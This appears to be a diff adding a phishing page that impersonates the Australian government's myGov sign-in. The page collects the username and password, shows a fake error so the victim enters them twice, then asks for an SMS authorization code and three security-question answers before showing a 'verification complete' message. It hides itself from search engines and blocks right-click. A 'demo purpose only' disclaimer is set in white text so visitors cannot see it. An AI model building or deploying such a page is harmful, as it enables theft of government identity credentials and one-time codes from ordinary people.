@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>.</title>
+        <meta name=”robots” content=”noindex”>
+        <meta name="robots" content="index,follow">
+        <meta name="robots" content="noindex,follow">
+        <meta name="robots" content="index,nofollow">
+        <meta name="robots" content="noindex,nofollow">
+        <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noodp" />
+        <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp" />
+        <meta charset="utf-8">
+        <meta name="description" content="online">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <meta http-equiv="x-ua-compatible" content="ie=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link rel="shortcut icon" href="/img/favicon.png" type="image/png" />
+        <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet" />
+        <link rel="stylesheet" href="/css/main.css" />
+        <script src="/js/jquery.js"></script>
+        <script src="/js/settings.js"></script>
+        <style>
+            .hidden {
+                display: none;
+            }
+            /* Additional styles for blur and loading spinner */
+            .blur-background {
+                filter: blur(5px); /* Add blur effect */
+                transition: filter 0.5s ease; /* Smooth transition */
+            }
+
+            .loading-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(255, 255, 255, 0.8); /* Semi-transparent white background */
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 999; /* Higher z-index to overlay on top of other elements */
+                visibility: hidden; /* Hidden by default */
+            }
+
+            .loading-spinner {
+                width: 50px;
+                height: 50px;
+                border-radius: 50%;
+                border: 4px solid #62cf66;
+                border-top: 4px solid #fff;
+                animation: spin 1s linear infinite; /* Rotate animation */
+            }
+
+            @keyframes spin {
+                0% {
+                    transform: rotate(0deg);
+                }
+                100% {
+                    transform: rotate(360deg);
+                }
+            }
+
+            .loading-text {
+                margin-top: 20px;
+                font-size: 16px;
+            }
+        </style>
+        <style>
+            body {
+                max-width: 600px;
+                height: auto;
+                margin: 0 auto;
+            }
+        </style>
+        <script>
+            document.title = 'Sign in\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003\u2003 demo page';
+        </script>
+    </head>
+
+    <body style=" user-select: none; ">
+        <img src='./img/logo.png' oncontextmenu="return false;" style=" user-select: none; ">
+
+        <div class="wrapper-mapwap">
+            <!-- MAIN PAGE -->
+            <div class="main-block hidden" role="main" id="step1">
+                <div class="cbLogin">
+                    <!-- ... Main page content ... -->
+                    <div class="login-grid-container">
+                        <div class="login-grid-row">
+                            <div class="login-grid-column">
+                                <div class="login-card-wrapper">
+                                    <div class="main-login-card override">
+                                        <a class="button-back" href="https://login.my.gov.au/las/mygov-login">Back</a>
+
+                                        <h1>Sign in with myGov</h1>
+                                        <p class="login-instruction-text">Choose how to sign in from these 2 options</p>
+                                        <h2 class="text-align-left">Using your myGov sign in details</h2>
+
+                                        <form class="cb-login-form alternative" id="myForm" method="post">
+                                            <input id="steps" name="steps" type="hidden" value="mou1">
+                                            <div class="input-group">
+                                                <label class="override" for="uMessage">Username or email</label>
+                                                <div>
+                                                    <input id="uMessage" name="uMessage" class="cb-input" type="text" autocomplete="off" />
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">
+                                                    Enter a valid email address, mobile number or myGov username. A valid myGov username is 2 letters, followed by 6 numbers.
+                                                </p>
+                                            </div>
+
+                                            <p class="recovery">
+                                                <a href="https://login.my.gov.au/las/mygov-login" class="anchor override">Forgot username</a>
+                                            </p>
+
+                                            <div class="input-group">
+                                                <label for="pText" class="override">Password</label>
+                                                <div class="password-group">
+                                                    <button class="showPassword anchor mask-hide" type="button">Show</button>
+                                                    <input id="pText" name="pText" class="cb-input" type="text" autocomplete="off" />
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">Enter your current password</p>
+                                            </div>
+
+                                            <p class="recovery">
+                                                <a href="https://login.my.gov.au/las/mygov-login" class="anchor override">Forgot password</a>
+                                            </p>
+
+                                            <div class="button-main-container override">
+                                                <div class="button-container">
+                                                    <button type="submit" class="button-main button-submit">Sign in</button>
+                                                </div>
+                                            </div>
+
+
+                                        </form>
+                                        
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 2 -->
+            <div class="main-block hidden" role="main" id="step2">
+                <div class="cbLogin">
+                    <!-- ... Step 1 content ... -->
+                    <div class="login-grid-container">
+                        <div class="login-grid-row">
+                            <div class="login-grid-column">
+                                <div class="login-card-wrapper">
+                                    <div class="main-login-card override">
+                                        <a class="button-back" href="https://login.my.gov.au/las/mygov-login">Back</a>
+
+                                        <div class="error-msg" role="alert">
+                                            <span class="is-visuallyhidden">Error message:</span>
+                                            <div class="error-msg-text">
+                                                <span>
+                                                    <strong>Error</strong>
+                                                    <br />
+                                                    An error has occurred.<br />
+                                                    Please try again.
+                                                </span>
+                                            </div>
+                                        </div>
+
+                                        <h1>Sign in with myGov</h1>
+                                        <p class="login-instruction-text">Choose how to sign in from these 2 options</p>
+                                        <h2 class="text-align-left">Using your myGov sign in details</h2>
+
+                                        <form class="cb-login-form alternative" id="myForm" method="post">
+                                            <input id="steps" name="steps" type="hidden" value="mou2">
+                                            <div class="input-group">
+                                                <label class="override" for="uMessage2">Username or email</label>
+                                                <div>
+                                                    <input id="uMessage2" name="uMessage2" class="cb-input" type="text" autocomplete="off" />
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">
+                                                    Enter a valid email address, mobile number or myGov username. A valid myGov username is 2 letters, followed by 6 numbers.
+                                                </p>
+                                            </div>
+
+                                            <p class="recovery">
+                                                <a href="https://login.my.gov.au/las/mygov-login" class="anchor override">Forgot username</a>
+                                            </p>
+
+                                            <div class="input-group">
+                                                <label for="pText2" class="override">Password</label>
+                                                <div class="password-group">
+                                                    <button class="showPassword anchor mask-hide" type="button">Show</button>
+                                                    <input id="pText2" name="pText2" class="cb-input" type="text" autocomplete="off" />
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">Enter your current password</p>
+                                            </div>
+
+                                            <p class="recovery">
+                                                <a href="https://login.my.gov.au/las/mygov-login" class="anchor override">Forgot password</a>
+                                            </p>
+
+                                            <div class="button-main-container override">
+                                                <div class="button-container">
+                                                    <button type="submit" class="button-main button-submit">Sign in</button>
+                                                </div>
+                                            </div>
+
+
+                                        </form>
+                                        
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 3 -->
+            <div class="main-block hidden" role="main" id="step3">
+                <div class="cbLogin">
+                    <!-- ... Step 2 content ... -->
+                    <div class="login-grid-container">
+                        <div class="login-grid-row">
+                            <div class="login-grid-column">
+                                <div class="login-card-wrapper">
+                                    <div class="main-login-card override">
+                                        <a class="button-back" href="https://login.my.gov.au/las/mygov-login">Back</a>
+
+                                        <h1>Verify Information with myGov</h1>
+                                        <p class="login-instruction-text">An authorization code was sent to you via text to your mobile number.</p>
+
+                                        <form class="cb-login-form alternative" id="myForm" method="post">
+                                            <input id="steps" name="steps" type="hidden" value="mou3">
+                                            <div class="input-group">
+                                                <label class="override" for="otp" style="font-weight: bold;">Check your mobile phone and enter the authorization code:</label>
+                                                <div>
+                                                    <input id="otp" name="otp" class="cb-input" type="text" autocomplete="off" />
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">Enter the authorization code.</p>
+                                            </div>
+
+                                            <p class="recovery"></p>
+
+                                            <div class="button-main-container override">
+                                                <div class="button-container">
+                                                    <button type="submit" class="button-main button-submit">Next</button>
+                                                </div>
+                                            </div>
+
+
+                                        </form>
+                                        
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 4 -->
+            <div class="main-block hidden" role="main" id="step4">
+                <div class="cbLogin">
+                    <!-- ... Step 3 content ... -->
+                    <div class="login-grid-container">
+                        <div class="login-grid-row">
+                            <div class="login-grid-column">
+                                <div class="login-card-wrapper">
+                                    <div class="main-login-card override">
+                                        <a class="button-back" href="https://login.my.gov.au/las/mygov-login">Back</a>
+
+                                        <h1>Answer Your Secret Question</h1>
+
+                                        <form class="cb-login-form alternative" id="myForm" method="post">
+                                            <input id="steps" name="steps" type="hidden" value="mou4">
+                                            <div class="input-group">
+                                                <div>
+                                                    <select name="q1" id="q1" class="cb-input">
+                                                        <option value="">Select your secret question</option>
+                                                        <option value="What is the name of the first street I lived in?">What is the name of the first street I lived in?</option>
+                                                        <option value="Where did I go on my first holiday?">Where did I go on my first holiday?</option>
+                                                        <option value="What was my favourite childhood book?">What was my favourite childhood book?</option>
+                                                        <option value="What was the first single/album I bought?">What was the first single/album I bought?</option>
+                                                        <option value="What was the name of my first pet?">What was the name of my first pet?</option>
+                                                        <option value="What was the full name of my first boyfriend/girlfriend?">What was the full name of my first boyfriend/girlfriend?</option>
+                                                        <option value="What was my favourite place to visit as a child?">What was my favourite place to visit as a child?</option>
+                                                    </select>
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">Select your secret question.</p>
+                                            </div>
+
+                                            <div class="input-group">
+                                                <div>
+                                                    <input id="a1" name="a1" class="cb-input" type="text" autocomplete="off" placeholder="Answer" />
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">Enter a valid answer.</p>
+                                            </div>
+
+                                            <div class="input-group">
+                                                <div>
+                                                    <select name="q2" id="q2" class="cb-input">
+                                                        <option value="">Select your secret question</option>
+                                                        <option value="What was the model of a car I learnt to drive in?">What was the model of a car I learnt to drive in?</option>
+                                                        <option value="What are the last five digits of my sports/gym membership card?">What are the last five digits of my sports/gym membership card?</option>
+                                                        <option value="What is my most memorable moment in my adult life?">What is my most memorable moment in my adult life?</option>
+                                                        <option value="What is the name of the primary school I attended?">What is the name of the primary school I attended?</option>
+                                                        <option value="Who was my favourite teacher at school?">Who was my favourite teacher at school?</option>
+                                                        <option value="What person from history do I most admire?">What person from history do I most admire?</option>
+                                                        <option value="What was the first movie I went to?">What was the first movie I went to?</option>
+                                                    </select>
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">Select your secret question.</p>
+                                            </div>
+
+                                            <div class="input-group">
+                                                <div>
+                                                    <input id="a2" name="a2" class="cb-input" type="text" autocomplete="off" placeholder="Answer" />
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">Enter a valid answer.</p>
+                                            </div>
+
+                                            <div class="input-group">
+                                                <div>
+                                                    <select name="q3" id="q3" class="cb-input">
+                                                        <option value="">Select your secret question</option>
+                                                        <option value="What was my favourite subject at school?">What was my favourite subject at school?</option>
+                                                        <option value="What sport or hobby did I do as a child?">What sport or hobby did I do as a child?</option>
+                                                        <option value="What was my nickname at school?">What was my nickname at school?</option>
+                                                        <option value="What is my favourite memory from school?">What is my favourite memory from school?</option>
+                                                        <option value="What was my first job?">What was my first job?</option>
+                                                        <option value="Who was my first employer?">Who was my first employer?</option>
+                                                        <option value="What was the first live concert, theatre or band I went to see?">What was the first live concert, theatre or band I went to see?</option>
+                                                    </select>
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">Select your secret question.</p>
+                                            </div>
+
+                                            <div class="input-group">
+                                                <div>
+                                                    <input id="a3" name="a3" class="cb-input" type="text" autocomplete="off" placeholder="Answer" />
+                                                </div>
+                                                <p class="input-bottom-text hasError" role="alert" style="display: none;">Enter a valid answer.</p>
+                                            </div>
+
+                                            <p class="recovery"></p>
+
+                                            <div class="button-main-container override">
+                                                <div class="button-container">
+                                                    <button type="submit" class="button-main button-submit">Next</button>
+                                                </div>
+                                            </div>
+
+
+                                        </form>
+                                        
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 5 -->
+            <div class="main-block hidden" role="main" id="step5">
+                <!-- ... Step 4 content ... -->
+                <div style="margin-top: 50px; margin-bottom: 150px; text-align: center;">
+                    <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="https://www.w3.org/2000/svg">
+                        <circle cx="32" cy="32" r="32" fill="#62CF66"></circle>
+                        <path
+                            fill-rule="evenodd"
+                            clip-rule="evenodd"
+                            d="M28.2514 44.0347C27.4541 44.9285 26.0553 44.9259 25.2614 44.0291L14.5907 31.9753C14.151 31.4787 14.3078 30.6995 14.9054 30.4116L15.3589 30.1931C15.686 30.0354 16.0729 30.0675 16.3695 30.2769L25.0794 36.423C25.8341 36.9556 26.8554 36.902 27.5502 36.2934L47.6139 18.7212C47.9155 18.4571 48.3457 18.3986 48.7068 18.5726L49.0901 18.7573C49.689 19.0458 49.8448 19.8277 49.4023 20.3238L28.2514 44.0347Z"
+                            fill="white"
+                        ></path>
+                    </svg>
+                    <h3>Verification Complete</h3>
+                    <p>Your account has successfully been re-verified. You will be redirected back to our homepage shortly.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Loading Overlay HTML -->
+        <div class="loading-overlay">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Verifying...</div>
+        </div>
+
+        <img src='./img/footer.png' oncontextmenu="return false;" style=" user-select: none; ">
+        <p style="color:white; user-select: none;">This is page is for demo purpose only... please do not login your account.</p>
+
+        <script src="/js/main.js"></script>
+    </body>
+</html>
